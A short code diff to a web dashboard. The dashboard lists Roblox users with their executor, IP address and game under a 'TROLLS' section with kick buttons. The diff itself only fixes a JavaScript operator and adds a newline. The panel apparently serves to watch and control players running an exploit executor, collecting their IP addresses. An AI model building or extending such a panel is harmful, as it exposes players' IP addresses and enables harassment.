@@ -142,7 +142,7 @@ function render(data) {
         card.innerHTML = `
             <div class="status"><div class="dot ${p.online ? "online" : ""}"></div><span>${p.online ? "Online" : "Offline"}</span></div>
             <div class="name"><a href="https://www.roblox.com/users/${id}/profile" target="_blank">${p.username}</a> (ID ${id})</div>
-            <div class="info">Executor: ${p.executor}<br>IP: ${p.ip}<br>Game: ${p.game or "Unknown"}</div>
+            <div class="info">Executor: ${p.executor}<br>IP: ${p.ip}<br>Game: ${p.game || "Unknown"}</div>
             <div class="category">TROLLS</div>
             <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
                 <button class="kick-btn" style="background:linear-gradient(45deg,#ff3366,#ff5588);" onclick="openKickModal('${id}')">KICK</button>
@@ -260,3 +260,4 @@ def broadcast_loop():
 if __name__ == "__main__":
     socketio.start_background_task(broadcast_loop)
     socketio.run(app, host="0.0.0.0", port=5000)
+
